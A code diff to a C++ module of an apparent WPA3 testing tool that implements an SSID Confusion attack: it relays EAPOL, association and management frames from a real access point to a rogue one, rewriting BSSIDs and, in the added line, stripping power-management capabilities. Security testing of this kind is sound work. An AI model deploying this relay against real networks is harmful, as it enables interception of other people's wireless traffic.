@@ -7,23 +7,18 @@
 #include "net_parser/kde_defs.h"
 #include "net_parser/radiotap_defs.h"
 #include "system/hw_capabilities.h"
-
 namespace wpa3_tester::ssid_confusion {
 using namespace Tins;
 using namespace std;
 using namespace std::chrono;
-
-
 void SsidConfusion::send_to_rogue(PDU &pdu) const {
 	const frame_raw_t raw = pdu.serialize();
 	send_to_rogue(raw);
 }
-
 void SsidConfusion::send_to_rogue(const frame_raw_t &raw) const {
 	const auto full_radiotap = ensure_radiotap(raw);
 	sock_rogue->send(full_radiotap, netconfig.rogue_channel);
 }
-
 FrameProcess SsidConfusion::handle_eapol_real(
 	const HWAddress<6> addr2, const PDU &pdu,
 	const frame_raw_t &raw) const {
@@ -52,7 +47,6 @@ FrameProcess SsidConfusion::handle_eapol_real(
 	}
 	return CONTINUE;
 }
-
 FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) {
 	if(dot11.find_pdu<Dot11ProbeRequest>() || dot11.find_pdu<Dot11ProbeResponse>()){
 		// only if not associated, to not disconnect of background scanning
@@ -64,7 +58,6 @@ FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Do
 	}
 	return CONTINUE;
 }
-
 FrameProcess SsidConfusion::handle_mgmt_action_real(const HWAddress<6> addr1, const Dot11 &dot11, const frame_raw_t &raw) const {
 	//Don't know what exactly - for example SA Query Request from real AP -> relay to STA on rogue (transparent, MIC stays valid)
 	if(dot11.type() == dot11::TYPE_MGMT && dot11.subtype() == dot11::MGMT_ACTION && addr1 == rogue_sta.get(SK::mac)) {
@@ -74,8 +67,6 @@ FrameProcess SsidConfusion::handle_mgmt_action_real(const HWAddress<6> addr1, co
 	}
 	return CONTINUE;
 }
-
-
 FrameProcess SsidConfusion::handle_assoc_real(
 	const HWAddress<6> addr1, const PDU &pdu,
 	const frame_raw_t &raw) const {
@@ -87,6 +78,7 @@ FrameProcess SsidConfusion::handle_assoc_real(
 			display_traffic(*dot11, "Real channel", " assoc resp -- relay to rogue");
 			auto relayed = ensure_radiotap(raw);
 			patch_ht_operation_in_frame(relayed, netconfig.rogue_channel.ch_num);
+			strip_power_mgmt_caps(relayed); // prevent client using sleep modes on rogue channel
 			rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
 			send_to_rogue(relayed);
 		}
@@ -94,7 +86,6 @@ FrameProcess SsidConfusion::handle_assoc_real(
 	}
 	return CONTINUE;
 }
-
 void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
 	auto *dot11 = pdu->find_pdu<Dot11>();
 	if(!dot11) return;
@@ -110,7 +101,6 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		return;
 	}
 	power_mgmt_response_real(addr2, *dot11);
-
 	// ignore useless
 	if(dot11->type() == dot11::TYPE_CTRL && dot11->subtype()) return;
 	if(dot11->find_pdu<Dot11Beacon>()) return; // don't relay real AP beacons
@@ -133,16 +123,13 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		handle_disconnect_real(*dot11);
 		return;
 	}
-
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
-
 	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
 	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
 	//TODO assoc ok for relaying? - test this is not issue for some clients
 	SOLVE_OR_CONTINUE(handle_assoc_real(addr1, *pdu, raw))
 	SOLVE_OR_CONTINUE(handle_mgmt_action_real(addr1, *dot11, raw))
 	#undef SOLVE_OR_CONTINUE
-
 	if((addr1 == rogue_sta.get(SK::mac) || addr2 == ap.get(SK::mac)) && client_state.get_state() >= ClientState::Associated) {
 		// libtins truncates SNAP/EAPOL frames -> handle_eapol_real misses msg1; strip here as fallback
 		auto to_send = raw;
@@ -151,5 +138,4 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		send_to_rogue(to_send);
 	}
 }
-
 }
